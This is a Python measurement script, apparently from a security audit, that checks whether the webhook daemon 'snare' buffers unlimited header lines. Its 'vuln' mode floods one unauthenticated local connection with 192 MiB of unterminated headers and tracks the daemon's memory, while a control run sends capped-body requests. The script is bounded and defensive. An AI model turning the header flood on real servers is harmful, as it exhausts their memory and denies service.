#!/usr/bin/env python3
"""Independent second-opinion measurement for ledger #111 (snare S1).

Written from scratch (does not reuse scratch/s1_headerflood.py) so the prior
lane's numbers are corroborated by an independent oracle.

Claim under test: snare's parse_get (src/httpserver.rs:326-383) caps only the
BODY (Content-Length <= 64 KiB). The request line and every header line are
read with unbounded read_line into Vec<String> (:329, :340-361) BEFORE any
authentication. Differential must be MEMORY GROWTH of the daemon process:

  vuln   : ONE unauthenticated connection streams non-terminating header
           lines (never a blank line). VmRSS of the daemon must track input.
           While the flood runs, trivial probes on fresh connections must
           still be answered (the accept loop is free) -- this is what makes
           S1 distinct from S2/#112 (16-slot accept-loop starvation).
  control: the SAME total byte volume as well-formed POSTs whose 32 KiB
           bodies go through the 64 KiB-capped body path with properly
           terminated headers. VmRSS must stay flat.

Everything is bounded: fixed dose, socket timeouts, a 90 s watchdog alarm.
Usage: measure.py <snare_pid> vuln|control
Exit codes: 0 measured; 2 harness error (daemon not reachable etc.).
"""
import json
import socket
import sys
import threading
import time

HOST, PORT = "127.0.0.1", 18013
DOSE = 192 * 1024 * 1024          # 192 MiB of header bytes on one connection
LINE = b"X-Canary-Flood: " + b"a" * 8160 + b"\r\n"   # ~8 KiB per header line
BODY = json.dumps({"repository": {"owner": {"login": "canary"}, "name": "canaryrepo"}}).encode()
BODY = BODY + b" " * (32 * 1024 - len(BODY))         # 32 KiB valid-JSON-ish ping body
MIB = 1024 * 1024


def die_harness(msg):
    print(f"HARNESS_ERROR={msg}")
    sys.exit(2)


def rss_mib(pid):
    try:
        with open(f"/proc/{pid}/status") as f:
            for ln in f:
                if ln.startswith("VmRSS:"):
                    return int(ln.split()[1]) / 1024.0
    except OSError:
        pass
    return None


def wait_for_port(timeout=5.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            s = socket.create_connection((HOST, PORT), timeout=0.5)
            s.close()
            return True
        except OSError:
            time.sleep(0.1)
    return False


def sampler(pid, state):
    while not state["stop"]:
        v = rss_mib(pid)
        if v is not None and v > state["peak"]:
            state["peak"] = v
        time.sleep(0.05)


def probe_answered():
    """One trivial request on a fresh connection; True if any HTTP bytes come back."""
    try:
        s = socket.create_connection((HOST, PORT), timeout=2)
        s.settimeout(2)
        s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
        data = s.recv(64)
        s.close()
        return bool(data)
    except OSError:
        return False


def vuln(pid):
    state = {"peak": rss_mib(pid), "stop": False}
    threading.Thread(target=sampler, args=(pid, state), daemon=True).start()
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(30)
    s.sendall(b"POST / HTTP/1.1\r\n")
    sent = 0
    probed = answered = 0
    while sent < DOSE:
        s.sendall(LINE)
        sent += len(LINE)
        if sent % (32 * MIB) < len(LINE):     # every ~32 MiB, check service
            probed += 1
            answered += probe_answered()
    time.sleep(1.0)                            # let the reader thread drain
    peak = state["peak"]
    s.close()                                  # hang up: attacker releases memory
    time.sleep(0.5)
    return sent, peak, rss_mib(pid), probed, answered


def control(pid):
    state = {"peak": rss_mib(pid), "stop": False}
    threading.Thread(target=sampler, args=(pid, state), daemon=True).start()
    req = (
        b"POST / HTTP/1.1\r\n"
        b"Host: 127.0.0.1\r\n"
        b"X-Github-Event: ping\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: " + str(len(BODY)).encode() + b"\r\n"
        b"\r\n" + BODY
    )
    sent = 0
    for _ in range(DOSE // len(BODY)):         # same volume via capped bodies
        s = socket.create_connection((HOST, PORT), timeout=10)
        s.settimeout(10)
        s.sendall(req)
        try:
            s.recv(256)
        except OSError:
            pass
        s.close()
        sent += len(req)
    time.sleep(0.5)
    return sent, state["peak"], rss_mib(pid), 0, 0


def main():
    if len(sys.argv) != 3 or sys.argv[2] not in ("vuln", "control"):
        die_harness("usage: measure.py <pid> vuln|control")
    pid = int(sys.argv[1])
    mode = sys.argv[2]
    import signal
    signal.alarm(90)                           # hard watchdog, bounded runtime
    if rss_mib(pid) is None:
        die_harness(f"no such snare pid {pid}")
    if not wait_for_port():
        die_harness("daemon not listening on 127.0.0.1:18013")
    start = rss_mib(pid)
    if mode == "vuln":
        sent, peak, after, probed, answered = vuln(pid)
    else:
        sent, peak, after, probed, answered = control(pid)
    delta = peak - start
    print(f"RSS_START_MIB={start:.0f}")
    print(f"RSS_PEAK_MIB={peak:.0f}")
    print(f"RSS_AFTER_CLOSE_MIB={'n/a' if after is None else f'{after:.0f}'}")
    print(f"BYTES_SENT_MIB={sent / MIB:.0f}")
    print(f"RSS_DELTA_MIB={delta:.0f}")
    print(f"RSS_DELTA_OVER_INPUT={delta / (sent / MIB):.2f}")
    if mode == "vuln":
        print(f"PROBES_ANSWERED_DURING_FLOOD={answered}/{probed}")
    # effect: daemon memory tracks attacker input (>=50% of dose; allocator /
    # thread noise is a few MiB). Control must show nothing like that.
    if delta >= 0.5 * (sent / MIB):
        print("CLAIM_EFFECT=unbounded_header_buffering")
    else:
        print("CLAIM_EFFECT=none")


main()
